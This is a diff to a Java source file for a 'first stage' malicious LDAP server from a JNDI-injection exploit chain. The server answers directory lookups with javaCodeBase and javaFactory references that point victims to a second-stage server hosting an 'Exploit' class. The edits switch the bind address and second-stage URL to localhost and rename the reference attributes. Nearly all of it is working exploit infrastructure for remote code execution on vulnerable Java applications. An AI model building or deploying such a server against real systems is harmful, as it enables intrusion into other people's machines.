@@ -16,7 +16,7 @@ LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 */
-package com.example;
+package org.example;
 
 
 import java.net.InetAddress;
@@ -54,13 +54,14 @@ public class FirstStageLDAPServer {
             System.err.println(FirstStageLDAPServer.class.getSimpleName() + "<second_stage_url>");
             System.exit(-1);
         }
-        String secondStageServerURL = args[0];
+        String hostName = "localhost";
+        String secondStageServerURL = "http://localhost:8888";
 
         try {
             InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
             config.setListenerConfigs(new InMemoryListenerConfig(
                     "listen", //$NON-NLS-1$
-                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
+                    InetAddress.getByName(hostName), //$NON-NLS-1$
                     port,
                     ServerSocketFactory.getDefault(),
                     SocketFactory.getDefault(),
@@ -68,7 +69,8 @@ public class FirstStageLDAPServer {
 
             config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(secondStageServerURL)));
             InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
-            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
+            System.out.println("First Stage Server Listen at: http://" + hostName + ":" + port);
+            System.out.println("Second Stage Server Listen at: " + secondStageServerURL);
             ds.startListening();
 
         }
@@ -101,10 +103,10 @@ public class FirstStageLDAPServer {
         protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
             System.out.println("Send LDAP reference result for " + base + " redirecting to " + this.codebase);
             String secondStageURL = prepareURL(base);
-            e.addAttribute("javaClassName", "Pawned");
+            e.addAttribute("javaClassName", "Exploit");
             e.addAttribute("javaCodeBase", secondStageURL);
-            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
-            e.addAttribute("javaFactory", "Exploit");
+//            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
+            e.addAttribute("javaFactory", "ExploitFactory");
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         }
